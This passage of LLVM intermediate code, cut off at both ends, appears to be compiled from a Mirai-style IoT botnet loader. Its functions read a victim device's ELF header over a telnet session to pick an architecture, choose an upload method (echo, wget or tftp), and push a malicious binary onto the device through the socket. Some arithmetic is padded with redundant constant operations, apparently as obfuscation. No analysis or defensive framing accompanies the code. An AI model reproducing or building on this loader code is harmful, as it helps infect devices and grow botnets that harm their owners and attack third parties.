  %68 = load %struct.connection*, %struct.connection** %3, align 8
  %69 = getelementptr inbounds %struct.connection, %struct.connection* %68, i32 0, i32 3
  %70 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %69, i32 0, i32 2
  %71 = getelementptr inbounds [6 x i8], [6 x i8]* %70, i32 0, i32 0
  %72 = call i8* @strcpy(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.22, i32 0, i32 0)) #5
  br label %219

; <label>:73:                                     ; preds = %61
  %74 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %75 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %74, i32 0, i32 2
  %76 = load i16, i16* %75, align 1
  %77 = zext i16 %76 to i32
  %78 = icmp eq i32 %77, 8
  br i1 %78, label %85, label %79

; <label>:79:                                     ; preds = %73
  %80 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %81 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %80, i32 0, i32 2
  %82 = load i16, i16* %81, align 1
  %83 = zext i16 %82 to i32
  %84 = icmp eq i32 %83, 10
  br i1 %84, label %85, label %105

; <label>:85:                                     ; preds = %79, %73
  %86 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %87 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %86, i32 0, i32 0
  %88 = getelementptr inbounds [16 x i8], [16 x i8]* %87, i64 0, i64 5
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 1
  br i1 %91, label %92, label %98

; <label>:92:                                     ; preds = %85
  %93 = load %struct.connection*, %struct.connection** %3, align 8
  %94 = getelementptr inbounds %struct.connection, %struct.connection* %93, i32 0, i32 3
  %95 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %94, i32 0, i32 2
  %96 = getelementptr inbounds [6 x i8], [6 x i8]* %95, i32 0, i32 0
  %97 = call i8* @strcpy(i8* %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #5
  br label %104

; <label>:98:                                     ; preds = %85
  %99 = load %struct.connection*, %struct.connection** %3, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 3
  %101 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %100, i32 0, i32 2
  %102 = getelementptr inbounds [6 x i8], [6 x i8]* %101, i32 0, i32 0
  %103 = call i8* @strcpy(i8* %102, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0)) #5
  br label %104

; <label>:104:                                    ; preds = %98, %92
  br label %218

; <label>:105:                                    ; preds = %79
  %106 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %107 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %106, i32 0, i32 2
  %108 = load i16, i16* %107, align 1
  %109 = zext i16 %108 to i32
  %110 = icmp eq i32 %109, 3
  br i1 %110, label %129, label %111

; <label>:111:                                    ; preds = %105
  %112 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %113 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %112, i32 0, i32 2
  %114 = load i16, i16* %113, align 1
  %115 = zext i16 %114 to i32
  %116 = icmp eq i32 %115, 6
  br i1 %116, label %129, label %117

; <label>:117:                                    ; preds = %111
  %118 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %119 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %118, i32 0, i32 2
  %120 = load i16, i16* %119, align 1
  %121 = zext i16 %120 to i32
  %122 = icmp eq i32 %121, 7
  br i1 %122, label %129, label %123

; <label>:123:                                    ; preds = %117
  %124 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %125 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %124, i32 0, i32 2
  %126 = load i16, i16* %125, align 1
  %127 = zext i16 %126 to i32
  %128 = icmp eq i32 %127, 62
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %123, %117, %111, %105
  %130 = load %struct.connection*, %struct.connection** %3, align 8
  %131 = getelementptr inbounds %struct.connection, %struct.connection* %130, i32 0, i32 3
  %132 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %131, i32 0, i32 2
  %133 = getelementptr inbounds [6 x i8], [6 x i8]* %132, i32 0, i32 0
  %134 = call i8* @strcpy(i8* %133, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0)) #5
  br label %217

; <label>:135:                                    ; preds = %123
  %136 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %137 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %136, i32 0, i32 2
  %138 = load i16, i16* %137, align 1
  %139 = zext i16 %138 to i32
  %140 = icmp eq i32 %139, 2
  br i1 %140, label %153, label %141

; <label>:141:                                    ; preds = %135
  %142 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %143 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %142, i32 0, i32 2
  %144 = load i16, i16* %143, align 1
  %145 = zext i16 %144 to i32
  %146 = icmp eq i32 %145, 18
  br i1 %146, label %153, label %147

; <label>:147:                                    ; preds = %141
  %148 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %149 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %148, i32 0, i32 2
  %150 = load i16, i16* %149, align 1
  %151 = zext i16 %150 to i32
  %152 = icmp eq i32 %151, 43
  br i1 %152, label %153, label %159

; <label>:153:                                    ; preds = %147, %141, %135
  %154 = load %struct.connection*, %struct.connection** %3, align 8
  %155 = getelementptr inbounds %struct.connection, %struct.connection* %154, i32 0, i32 3
  %156 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %155, i32 0, i32 2
  %157 = getelementptr inbounds [6 x i8], [6 x i8]* %156, i32 0, i32 0
  %158 = call i8* @strcpy(i8* %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.26, i32 0, i32 0)) #5
  br label %216

; <label>:159:                                    ; preds = %147
  %160 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %161 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %160, i32 0, i32 2
  %162 = load i16, i16* %161, align 1
  %163 = zext i16 %162 to i32
  %164 = icmp eq i32 %163, 4
  br i1 %164, label %171, label %165

; <label>:165:                                    ; preds = %159
  %166 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %167 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %166, i32 0, i32 2
  %168 = load i16, i16* %167, align 1
  %169 = zext i16 %168 to i32
  %170 = icmp eq i32 %169, 5
  br i1 %170, label %171, label %177

; <label>:171:                                    ; preds = %165, %159
  %172 = load %struct.connection*, %struct.connection** %3, align 8
  %173 = getelementptr inbounds %struct.connection, %struct.connection* %172, i32 0, i32 3
  %174 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %173, i32 0, i32 2
  %175 = getelementptr inbounds [6 x i8], [6 x i8]* %174, i32 0, i32 0
  %176 = call i8* @strcpy(i8* %175, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0)) #5
  br label %215

; <label>:177:                                    ; preds = %165
  %178 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %179 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %178, i32 0, i32 2
  %180 = load i16, i16* %179, align 1
  %181 = zext i16 %180 to i32
  %182 = icmp eq i32 %181, 20
  br i1 %182, label %189, label %183

; <label>:183:                                    ; preds = %177
  %184 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %185 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %184, i32 0, i32 2
  %186 = load i16, i16* %185, align 1
  %187 = zext i16 %186 to i32
  %188 = icmp eq i32 %187, 21
  br i1 %188, label %189, label %195

; <label>:189:                                    ; preds = %183, %177
  %190 = load %struct.connection*, %struct.connection** %3, align 8
  %191 = getelementptr inbounds %struct.connection, %struct.connection* %190, i32 0, i32 3
  %192 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %191, i32 0, i32 2
  %193 = getelementptr inbounds [6 x i8], [6 x i8]* %192, i32 0, i32 0
  %194 = call i8* @strcpy(i8* %193, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i32 0, i32 0)) #5
  br label %214

; <label>:195:                                    ; preds = %183
  %196 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %197 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %196, i32 0, i32 2
  %198 = load i16, i16* %197, align 1
  %199 = zext i16 %198 to i32
  %200 = icmp eq i32 %199, 42
  br i1 %200, label %201, label %207

; <label>:201:                                    ; preds = %195
  %202 = load %struct.connection*, %struct.connection** %3, align 8
  %203 = getelementptr inbounds %struct.connection, %struct.connection* %202, i32 0, i32 3
  %204 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %203, i32 0, i32 2
  %205 = getelementptr inbounds [6 x i8], [6 x i8]* %204, i32 0, i32 0
  %206 = call i8* @strcpy(i8* %205, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #5
  br label %213

; <label>:207:                                    ; preds = %195
  %208 = load %struct.connection*, %struct.connection** %3, align 8
  %209 = getelementptr inbounds %struct.connection, %struct.connection* %208, i32 0, i32 3
  %210 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %209, i32 0, i32 2
  %211 = getelementptr inbounds [6 x i8], [6 x i8]* %210, i64 0, i64 0
  store i8 0, i8* %211, align 8
  %212 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %212)
  br label %213

; <label>:213:                                    ; preds = %207, %201
  br label %214

; <label>:214:                                    ; preds = %213, %189
  br label %215

; <label>:215:                                    ; preds = %214, %171
  br label %216

; <label>:216:                                    ; preds = %215, %153
  br label %217

; <label>:217:                                    ; preds = %216, %129
  br label %218

; <label>:218:                                    ; preds = %217, %104
  br label %219

; <label>:219:                                    ; preds = %218, %67
  br label %264

; <label>:220:                                    ; preds = %1
  %221 = load %struct.connection*, %struct.connection** %3, align 8
  %222 = getelementptr inbounds %struct.connection, %struct.connection* %221, i32 0, i32 15
  %223 = getelementptr inbounds [8192 x i8], [8192 x i8]* %222, i32 0, i32 0
  %224 = load %struct.connection*, %struct.connection** %3, align 8
  %225 = getelementptr inbounds %struct.connection, %struct.connection* %224, i32 0, i32 9
  %226 = load i16, i16* %225, align 8
  %227 = zext i16 %226 to i32
  %228 = call i32 @util_memsearch(i8* %223, i32 %227, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %228, i32* %6, align 4
  %229 = icmp ne i32 %228, -1
  br i1 %229, label %230, label %232

; <label>:230:                                    ; preds = %220
  %231 = load i32, i32* %6, align 4
  store i32 %231, i32* %2, align 4
  br label %265

; <label>:232:                                    ; preds = %220
  %233 = load %struct.connection*, %struct.connection** %3, align 8
  %234 = getelementptr inbounds %struct.connection, %struct.connection* %233, i32 0, i32 9
  %235 = load i16, i16* %234, align 8
  %236 = zext i16 %235 to i32
  %237 = icmp sgt i32 %236, 7168
  br i1 %237, label %238, label %263

; <label>:238:                                    ; preds = %232
  %239 = load %struct.connection*, %struct.connection** %3, align 8
  %240 = getelementptr inbounds %struct.connection, %struct.connection* %239, i32 0, i32 15
  %241 = getelementptr inbounds [8192 x i8], [8192 x i8]* %240, i32 0, i32 0
  %242 = load %struct.connection*, %struct.connection** %3, align 8
  %243 = getelementptr inbounds %struct.connection, %struct.connection* %242, i32 0, i32 15
  %244 = getelementptr inbounds [8192 x i8], [8192 x i8]* %243, i32 0, i32 0
  %245 = getelementptr inbounds i8, i8* %244, i64 6144
  %246 = load %struct.connection*, %struct.connection** %3, align 8
  %247 = getelementptr inbounds %struct.connection, %struct.connection* %246, i32 0, i32 9
  %248 = load i16, i16* %247, align 8
  %249 = zext i16 %248 to i32
  %250 = sub i32 %249, -1604113242
  %251 = sub i32 %250, 6144
  %252 = add i32 %251, -1604113242
  %253 = sub nsw i32 %249, 6144
  %254 = sext i32 %252 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %241, i8* %245, i64 %254, i32 1, i1 false)
  %255 = load %struct.connection*, %struct.connection** %3, align 8
  %256 = getelementptr inbounds %struct.connection, %struct.connection* %255, i32 0, i32 9
  %257 = load i16, i16* %256, align 8
  %258 = zext i16 %257 to i32
  %259 = sub i32 0, 6144
  %260 = add i32 %258, %259
  %261 = sub nsw i32 %258, 6144
  %262 = trunc i32 %260 to i16
  store i16 %262, i16* %256, align 8
  br label %263

; <label>:263:                                    ; preds = %238, %232
  br label %264

; <label>:264:                                    ; preds = %263, %219
  store i32 0, i32* %2, align 4
  br label %265

; <label>:265:                                    ; preds = %264, %230, %44, %22
  %266 = load i32, i32* %2, align 4
  ret i32 %266
}

declare i32 @htons(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arm_subtype(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %38

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i32 5)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %30, label %23

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 15
  %26 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i32 0, i32 0
  %27 = load i32, i32* %4, align 4
  %28 = call i32 @util_memsearch(i8* %26, i32 %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i32 5)
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %30, label %36

; <label>:30:                                     ; preds = %23, %16
  %31 = load %struct.connection*, %struct.connection** %3, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 3
  %33 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %32, i32 0, i32 2
  %34 = getelementptr inbounds [6 x i8], [6 x i8]* %33, i32 0, i32 0
  %35 = call i8* @strcpy(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #5
  br label %36

; <label>:36:                                     ; preds = %30, %23
  %37 = load i32, i32* %4, align 4
  store i32 %37, i32* %2, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %15
  %39 = load i32, i32* %2, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_upload_methods(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %45

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.33, i32 0, i32 0), i32 22)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %27

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 3
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 6
  store i32 1, i32* %26, align 8
  br label %43

; <label>:27:                                     ; preds = %16
  %28 = load %struct.connection*, %struct.connection** %3, align 8
  %29 = getelementptr inbounds %struct.connection, %struct.connection* %28, i32 0, i32 15
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %29, i32 0, i32 0
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @util_memsearch(i8* %30, i32 %31, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.34, i32 0, i32 0), i32 22)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %38

; <label>:34:                                     ; preds = %27
  %35 = load %struct.connection*, %struct.connection** %3, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 3
  %37 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %36, i32 0, i32 6
  store i32 2, i32* %37, align 8
  br label %42

; <label>:38:                                     ; preds = %27
  %39 = load %struct.connection*, %struct.connection** %3, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 3
  %41 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %40, i32 0, i32 6
  store i32 0, i32* %41, align 8
  br label %42

; <label>:42:                                     ; preds = %38, %34
  br label %43

; <label>:43:                                     ; preds = %42, %23
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %2, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %15
  %46 = load i32, i32* %2, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_echo(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %90

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 2
  %19 = load %struct.binary*, %struct.binary** %18, align 8
  %20 = icmp eq %struct.binary* %19, null
  br i1 %20, label %21, label %23

; <label>:21:                                     ; preds = %16
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %22)
  store i32 0, i32* %2, align 4
  br label %90

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 5
  %26 = load i32, i32* %25, align 4
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 2
  %29 = load %struct.binary*, %struct.binary** %28, align 8
  %30 = getelementptr inbounds %struct.binary, %struct.binary* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 8
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %23
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %2, align 4
  br label %90

; <label>:35:                                     ; preds = %23
  %36 = load %struct.connection*, %struct.connection** %3, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 4
  %38 = load i32, i32* %37, align 8
  %39 = load %struct.connection*, %struct.connection** %3, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 2
  %41 = load %struct.binary*, %struct.binary** %40, align 8
  %42 = getelementptr inbounds %struct.binary, %struct.binary* %41, i32 0, i32 2
  %43 = load i8**, i8*** %42, align 8
  %44 = load %struct.connection*, %struct.connection** %3, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 5
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8*, i8** %43, i64 %47
  %49 = load i8*, i8** %48, align 8
  %50 = load %struct.connection*, %struct.connection** %3, align 8
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %50, i32 0, i32 5
  %52 = load i32, i32* %51, align 4
  %53 = icmp eq i32 %52, 0
  %54 = select i1 %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0)
  %55 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %38, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i32 0, i32 0), i8* %49, i8* %54)
  %56 = load %struct.connection*, %struct.connection** %3, align 8
  %57 = getelementptr inbounds %struct.connection, %struct.connection* %56, i32 0, i32 5
  %58 = load i32, i32* %57, align 4
  %59 = sub i32 %58, 1842983626
  %60 = add i32 %59, 1
  %61 = add i32 %60, 1842983626
  %62 = add nsw i32 %58, 1
  store i32 %61, i32* %57, align 4
  %63 = load %struct.connection*, %struct.connection** %3, align 8
  %64 = getelementptr inbounds %struct.connection, %struct.connection* %63, i32 0, i32 15
  %65 = getelementptr inbounds [8192 x i8], [8192 x i8]* %64, i32 0, i32 0
  %66 = load %struct.connection*, %struct.connection** %3, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 15
  %68 = getelementptr inbounds [8192 x i8], [8192 x i8]* %67, i32 0, i32 0
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load %struct.connection*, %struct.connection** %3, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 9
  %74 = load i16, i16* %73, align 8
  %75 = zext i16 %74 to i32
  %76 = load i32, i32* %4, align 4
  %77 = sub i32 0, %76
  %78 = add i32 %75, %77
  %79 = sub nsw i32 %75, %76
  %80 = sext i32 %78 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %65, i8* %71, i64 %80, i32 1, i1 false)
  %81 = load i32, i32* %4, align 4
  %82 = load %struct.connection*, %struct.connection** %3, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 9
  %84 = load i16, i16* %83, align 8
  %85 = zext i16 %84 to i32
  %86 = sub i32 0, %81
  %87 = add i32 %85, %86
  %88 = sub nsw i32 %85, %81
  %89 = trunc i32 %87 to i16
  store i16 %89, i16* %83, align 8
  store i32 0, i32* %2, align 4
  br label %90

; <label>:90:                                     ; preds = %35, %33, %21, %15
  %91 = load i32, i32* %2, align 4
  ret i32 %91
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_wget(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_tftp(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %48

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.38, i32 0, i32 0), i32 17)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %23, label %26

; <label>:23:                                     ; preds = %16
  %24 = load i32, i32* %4, align 4
  %25 = mul nsw i32 %24, -1
  store i32 %25, i32* %2, align 4
  br label %48

; <label>:26:                                     ; preds = %16
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 15
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i32 0, i32 0
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @util_memsearch(i8* %29, i32 %30, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i32 7)
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %36

; <label>:33:                                     ; preds = %26
  %34 = load i32, i32* %4, align 4
  %35 = mul nsw i32 %34, -1
  store i32 %35, i32* %2, align 4
  br label %48

; <label>:36:                                     ; preds = %26
  %37 = load %struct.connection*, %struct.connection** %3, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 15
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %38, i32 0, i32 0
  %40 = load i32, i32* %4, align 4
  %41 = call i32 @util_memsearch(i8* %39, i32 %40, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0), i32 14)
  %42 = icmp ne i32 %41, -1
  br i1 %42, label %43, label %46

; <label>:43:                                     ; preds = %36
  %44 = load i32, i32* %4, align 4
  %45 = mul nsw i32 %44, -1
  store i32 %45, i32* %2, align 4
  br label %48

; <label>:46:                                     ; preds = %36
  %47 = load i32, i32* %4, align 4
  store i32 %47, i32* %2, align 4
  br label %48

; <label>:48:                                     ; preds = %46, %43, %33, %23, %15
  %49 = load i32, i32* %2, align 4
  ret i32 %49
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_verify_payload(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
